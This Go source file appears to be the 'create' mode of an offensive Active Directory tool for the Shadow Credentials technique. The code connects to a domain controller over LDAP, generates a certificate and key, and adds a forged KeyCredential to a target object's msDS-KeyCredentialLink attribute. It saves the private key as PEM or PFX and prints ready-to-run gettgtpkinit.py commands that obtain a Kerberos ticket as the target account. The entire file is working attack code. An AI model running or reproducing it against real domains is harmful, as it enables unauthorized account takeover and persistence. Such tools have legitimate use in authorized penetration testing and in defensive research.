package mode_create

import (
	"fmt"
	"time"

	"shadowcredentials/core/config"
	"shadowcredentials/keycredentiallink"
	"shadowcredentials/keycredentiallink/cryptography"
	"shadowcredentials/keycredentiallink/key"
	"shadowcredentials/ldap"
	"shadowcredentials/logger"
	"shadowcredentials/utils"

	"github.com/p0dalirius/winacl/guid"
)

// Run creates a new KeyCredentialLink and exports it to PEM, PFX, and binary formats.
//
// Parameters:
// - owner: The owner of the KeyCredential.
// - identifier: The identifier of the KeyCredential.
// - creationTime: The creation time of the KeyCredential.
// - lastLogonTime: The last logon time of the KeyCredential.
// - notBefore: The notBefore time of the KeyCredential.
// - notAfter: The notAfter time of the KeyCredential.
// - deviceId: The device ID of the KeyCredential.
// - keySize: The key size of the KeyCredential.
// - debug: Whether to enable debug mode.
func Run(distinguishedName, identifier, creationTime, lastLogonTime, notBefore, notAfter, deviceId string, keySize int, exportPem, exportPfx bool, config config.Config) error {
	if config.Debug {
		logger.Debug("Starting mode 'create'")
	}

	// Time to add the keycredential to the user
	ldapSession := ldap.Session{}
	ldapSession.InitSession(
		config.Network.DomainController,
		config.Network.LDAP.LDAPPort,
		config.Network.LDAP.UseLdaps,
		config.Network.Domain,
		config.Credentials.Username,
		config.Credentials.Password,
		config.Debug,
	)
	connected := ldapSession.Connect()
	if connected {
		if config.Debug {
			if config.Network.LDAP.UseLdaps {
				logger.Debug(fmt.Sprintf("Connected as '%s\\%s' on ldaps://%s:%d", config.Network.Domain, config.Credentials.Username, config.Network.DomainController, config.Network.LDAP.LDAPPort))
			} else {
				logger.Debug(fmt.Sprintf("Connected as '%s\\%s' on ldap://%s:%d", config.Network.Domain, config.Credentials.Username, config.Network.DomainController, config.Network.LDAP.LDAPPort))
			}
		}

		logger.Info(fmt.Sprintf("Searching for target object: %s", distinguishedName))
		query := fmt.Sprintf("(distinguishedName=%s)", distinguishedName)

		attributes := []string{"distinguishedName", "msDS-KeyCredentialLink", "sAMAccountName"}
		ldapResults := ldap.QueryWholeSubtree(&ldapSession, "", query, attributes)

		if config.Debug {
			logger.Debug(fmt.Sprintf("Found %d objects with distinguishedName: %s", len(ldapResults), distinguishedName))
			for _, entry := range ldapResults {
				logger.Debug(fmt.Sprintf(" | %s", entry.GetAttributeValue("distinguishedName")))
			}
		}

		if len(ldapResults) == 0 {
			logger.Warn(fmt.Sprintf("No objects with distinguishedName '%s' found.", distinguishedName))
			return fmt.Errorf("no objects with distinguishedName '%s' found", distinguishedName)
		}

		if len(ldapResults) > 1 {
			logger.Warn(fmt.Sprintf("Too many objects with distinguishedName '%s' found (%d).", distinguishedName, len(ldapResults)))
			return fmt.Errorf("too many objects with distinguishedName '%s' found (%d)", distinguishedName, len(ldapResults))
		}

		logger.Info(fmt.Sprintf("Target object currently has %d msDS-KeyCredentialLink values", len(ldapResults[0].GetAttributeValues("msDS-KeyCredentialLink"))))

		// Prepare time values
		notBeforeTime, err := utils.TimeParseOrNow(notBefore)
		if err != nil {
			return fmt.Errorf("error parsing notBefore: %s", err)
		}
		// Set notAfter to 1 year from notBefore if not specified
		notAfterTime := notBeforeTime.Add(time.Hour * 24 * 365 * 1)
		if len(notAfter) > 0 {
			notAfterTime, err = utils.TimeParseOrNow(notAfter)
			if err != nil {
				return fmt.Errorf("error parsing notAfter: %s", err)
			}
		}
		// Set key size to 2048 if not specified
		if keySize == 0 {
			if config.Debug {
				logger.Debug("Key size set to 0, using default of 2048bits")
			}
			keySize = 2048
		}

		sAMAccountName := ldapResults[0].GetAttributeValue("sAMAccountName")

		logger.Info("Creating new X509Certificate")
		cert, err := cryptography.NewX509Certificate(sAMAccountName, keySize, notBeforeTime, notAfterTime)
		if err != nil {
			return fmt.Errorf("error creating X509Certificate: %s", err)
		}

		// Prepare values for the KeyCredential
		keyVersion := key.KeyCredentialVersion{Value: key.KeyCredentialVersion_2}

		if len(identifier) == 0 {
			identifier = "COLlcAvA6VItQ0wTnBW3Z2eChNki336Sug3RfWJAfp0="
		}

		creationDateTime := utils.NewDateTimeFromTime(notBeforeTime)

		lastLogonDateTime := utils.NewDateTimeFromTime(notBeforeTime)

		deviceIdGUID := guid.NewGUID()
		if len(deviceId) > 0 {
			deviceIdGUID, err = guid.FromString(deviceId)
			if err != nil {
				return fmt.Errorf("error parsing deviceId: %s", err)
			}
		}

		if config.Debug {
			logger.Debug(fmt.Sprintf("KeyCredentialVersion: %s", keyVersion.String()))
			logger.Debug(fmt.Sprintf("Identifier: %s", identifier))
			logger.Debug(fmt.Sprintf("CreationTime: %s", creationDateTime.String()))
			logger.Debug(fmt.Sprintf("LastLogonTime: %s", lastLogonDateTime.String()))
			logger.Debug(fmt.Sprintf("DeviceId: %s", deviceIdGUID.ToFormatD()))
		}

		keyCredential := keycredentiallink.NewKeyCredential(
			keyVersion,
			identifier,
			cert.GetRSAKeyMaterial(),
			deviceIdGUID,
			creationDateTime,
			lastLogonDateTime,
		)
		if config.Debug {
			keyCredential.Describe(0)
		}

		rawBytes, err := keyCredential.ToBytes()
		if err != nil {
			fmt.Printf("[error] Error converting KeyCredential to raw bytes: %s\n", err)
		}
		dnWithBinary := keycredentiallink.DNWithBinary{DistinguishedName: distinguishedName, BinaryData: rawBytes}
		msDSKeyCredentialLinkValue := dnWithBinary.String()
		if config.Debug {
			logger.Debug(fmt.Sprintf("msDS-KeyCredentialLink: %s", msDSKeyCredentialLinkValue))
		}

		//
		err = ldapSession.AddStringToAttributeList(
			ldapResults[0].GetAttributeValue("distinguishedName"),
			"msDS-KeyCredentialLink",
			msDSKeyCredentialLinkValue,
		)

		if err != nil {
			logger.Warn(fmt.Sprintf("Error adding value to attribute: %s", err))
			return fmt.Errorf("error adding value to attribute: %s", err)
		} else {
			logger.Info("Successfully added a new KeyCredentialLink to the existing msDS-KeyCredentialLink value")

			// Export the certificate to PEM, PFX, and binary formats
			datePrefix := time.Now().Format("2006-01-02_15-04-05")

			// Export the PEM
			if exportPem {
				filePrivateKey := fmt.Sprintf("./keys/%s/%s.pem", datePrefix, utils.PathSafeString(distinguishedName))
				fileCertificatePem := fmt.Sprintf("./keys/%s/%s.cert.pem", datePrefix, utils.PathSafeString(distinguishedName))
				// Export the private key
				cert.ExportRSAPrivateKeyPEM(filePrivateKey)
				logger.Info(fmt.Sprintf(" | Saved PEM private key: %s", filePrivateKey))
				// Export the public key
				cert.ExportCertificatePEM(fileCertificatePem)
				logger.Info(fmt.Sprintf(" | Saved PEM certificate: %s", fileCertificatePem))

				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pem '%s' -key-pem '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePem, filePrivateKey, config.Network.Domain, config.Credentials.Username, sAMAccountName))
			}

			// Export the PFX
			if exportPfx {
				pfxPassword := utils.RandomString(16)
				fileCertificatePFX := fmt.Sprintf("./keys/%s/%s_%s.pfx", datePrefix, utils.PathSafeString(distinguishedName), pfxPassword)

				cert.ExportCertificatePFX(fileCertificatePFX, pfxPassword)
				logger.Info(fmt.Sprintf(" | Saved PFX with password '%s': %s", pfxPassword, fileCertificatePFX))

				logger.Info("You can now get a TGT for this account using https://github.com/dirkjanm/PKINITtools with this command:")
				logger.Info(fmt.Sprintf("python3 gettgtpkinit.py -dc-ip '%s' -cert-pfx '%s' -pfx-pass '%s' '%s/%s' '%s.ccache'", config.Network.DomainController, fileCertificatePFX, pfxPassword, config.Network.Domain, config.Credentials.Username, sAMAccountName))
			}

		}
	} else {
		return fmt.Errorf("error connecting to LDAP server")
	}

	return nil
}
